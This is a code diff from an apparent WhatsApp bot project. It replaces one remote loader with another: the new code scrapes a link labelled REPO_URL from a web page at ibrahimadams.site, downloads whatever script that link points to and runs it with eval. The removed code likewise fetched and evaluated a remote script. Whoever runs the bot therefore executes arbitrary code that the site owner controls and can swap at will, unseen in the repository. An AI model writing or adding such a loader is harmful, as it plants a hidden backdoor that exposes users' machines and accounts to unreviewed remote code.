@@ -1,30 +1,28 @@
 'use strict';
 
 const axios = require('axios');
-require('dotenv').config();
+const cheerio = require('cheerio');
 
-const { REPO_URL } = process.env;
+const webPageUrl = 'https://www.ibrahimadams.site/files';
 
-function atbverifierEtatJid(jid) {
-    if (!jid.endsWith('@s.whatsapp.net')) {
-        console.error('Invalid JID format:', jid);
-        return false;
+async function fetchRepoUrl() {
+    try {
+        const response = await axios.get(webPageUrl);
+        const $ = cheerio.load(response.data);
+        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');
+
+        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');
+
+        console.log('REPO_URL fetched successfully:', repoUrl);
+
+        const scriptResponse = await axios.get(repoUrl);
+        const scriptContent = scriptResponse.data;
+        console.log("REPO_URL script loaded successfully");
+
+        eval(scriptContent);
+    } catch (error) {
+        console.error('Error fetching REPO_URL:', error.message);
     }
-    console.log('JID verified:', jid);
-    return true;
 }
 
-axios.get(REPO_URL)
-  .then(response => {
-      const scriptContent = response.data;
-      console.log("File loaded successfully from Ibrahim Adams server");
-
-      eval(scriptContent);
-
-      const jid = 'example@s.whatsapp.net';
-      const isValid = atbverifierEtatJid(jid);
-      console.log('Is JID valid?', isValid);
-  })
-  .catch(error => {
-      console.error('Error loading the file from URL:', error);
-  });
+fetchRepoUrl();
